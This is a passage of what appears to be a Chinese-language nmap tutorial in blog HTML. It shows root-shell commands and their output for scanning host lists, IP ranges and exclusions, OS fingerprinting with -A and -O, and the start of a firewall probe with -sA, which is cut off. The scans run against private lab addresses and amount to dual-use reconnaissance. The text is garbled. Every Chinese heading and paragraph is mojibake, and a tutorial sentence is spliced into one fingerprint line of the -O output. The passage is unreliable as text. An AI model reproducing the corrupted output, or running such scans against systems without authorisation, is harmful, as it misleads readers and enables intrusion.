<span class="number">16</span>:<span class="number">11</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>):</span><br><span class="line">Not shown: <span class="number">1677</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">851</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.550</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="5-ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨-ï¼Œ"><a href="#5-ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨-ï¼Œ" class="headerlink" title="5.ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨ ï¼Œ"></a>5.ä½¿ç”¨IPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ‰«æå¤šå°æœåŠ¡å™¨ ï¼Œ</h3><p>ä½ å¯ä»¥ç®€å•çš„æŒ‡å®šIPåœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚æ¥å¯¹å¤šä¸ªIPåœ°å€è¿›è¡Œæ‰«æã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨ä¸‹é¢æ‰§è¡Œä¸­æ‰«æäº†IPåœ°å€192.168.0.101ï¼Œ192.168.0.102å’Œ192.168.0.103ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>,<span class="number">102</span>,<span class="number">103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.552</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="6-ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨-iL"><a href="#6-ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨-iL" class="headerlink" title="6. ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨ -iL"></a>6. ä»ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰«æä¸»æœºåˆ—è¡¨ -iL</h3><p>å¦‚æœä½ æœ‰å¤šå°ä¸»æœºéœ€è¦æ‰«æä¸”æ‰€æœ‰ä¸»æœºä¿¡æ¯éƒ½å†™åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç›´æ¥è®©nmapè¯»å–è¯¥æ–‡ä»¶æ¥æ‰§è¡Œæ‰«æï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><p>åˆ›å»ºä¸€ä¸ªåä¸ºâ€œnmaptest.txt â€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å®šä¹‰æ‰€æœ‰ä½ æƒ³è¦æ‰«æçš„æœåŠ¡å™¨IPåœ°å€æˆ–ä¸»æœºåã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@server1 ~]</span># <span class="selector-tag">cat</span>  <span class="selector-tag">nmaptest</span><span class="selector-class">.txt</span> </span><br><span class="line"><span class="selector-tag">localhost</span></span><br><span class="line"><span class="selector-tag">server2</span><span class="selector-class">.tecmint</span><span class="selector-class">.com</span></span><br><span class="line">192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿è¡Œå¸¦â€œiLâ€é€‰é¡¹çš„nmapå‘½ä»¤æ¥æ‰«ææ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰IPåœ°å€</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -iL nmaptest.txt </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">58</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> localhost.localdomain (<span class="number">127.0</span>.<span class="number">0.1</span>):</span><br><span class="line">Not shown: <span class="number">1675</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">25</span>/tcp  <span class="keyword">open</span>  smtp</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">631</span>/tcp <span class="keyword">open</span>  ipp</span><br><span class="line"><span class="number">857</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.047</span> seconds</span><br></pre></td></tr></table></figure><h3 id="7-æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´"><a href="#7-æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´" class="headerlink" title="7.æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´ -"></a>7.æ‰«æä¸€ä¸ªIPåœ°å€èŒƒå›´ -</h3><p>ä½ å¯ä»¥åœ¨nmapæ‰§è¡Œæ‰«ææ—¶æŒ‡å®šIPèŒƒå›´ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>-<span class="number">110</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">10</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.542</span> seconds</span><br></pre></td></tr></table></figure><h3 id="8-æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude"><a href="#8-æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude" class="headerlink" title="8.æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude"></a>8.æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude</h3><p>åœ¨æ‰§è¡Œå…¨ç½‘æ‰«ææˆ–ç”¨é€šé…ç¬¦æ‰«ææ—¶ä½ å¯ä»¥ä½¿ç”¨â€œâ€“excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">16</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">255</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">5.313</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="9-æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A"><a href="#9-æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A" class="headerlink" title="9.æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A"></a>9.æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A</h3><p>ä½¿ç”¨Nmapï¼Œä½ å¯ä»¥æ£€æµ‹è¿œç¨‹ä¸»æœºä¸Šè¿è¡Œçš„æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ã€‚ä¸ºäº†å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨NMAPçš„â€œ<strong>-A</strong>â€œé€‰é¡¹ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">A</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">25</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52814B66%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„è¾“å‡ºä½ å¯ä»¥çœ‹åˆ°ï¼ŒNmapæ˜¾ç¤ºå‡ºäº†è¿œç¨‹ä¸»æœº<strong>æ“ä½œç³»ç»Ÿçš„TCP</strong> / <strong>IP</strong>åè®®æŒ‡çº¹ï¼Œå¹¶ä¸”æ›´åŠ å…·ä½“çš„æ˜¾ç¤ºå‡ºè¿œç¨‹ä¸»æœºä¸Šçš„ç«¯å£å’ŒæœåŠ¡ã€‚</p><h3 id="10-å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O"><a href="#10-å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O" class="headerlink" title="10.å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O"></a>10.å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O</h3><p>ä½¿ç”¨é€‰é¡¹â€œ<strong>-O</strong>â€å’Œâ€œ<strong>-osscan-guess</strong>â€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">O</span> server2.tecmint.com</span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">40</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52815CF4%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">Option</span> -<span class="type">O</span> and -osscan-guess also helps to discover <span class="type">OS</span></span><br><span class="line"><span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="11-æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA"><a href="#11-æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA" class="headerlink" title="11.æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA"></a>11.æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA</h3><p>ä¸‹é¢çš„å‘½ä»¤å°†æ‰«æè¿œç¨‹ä¸»æœºä»¥æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span 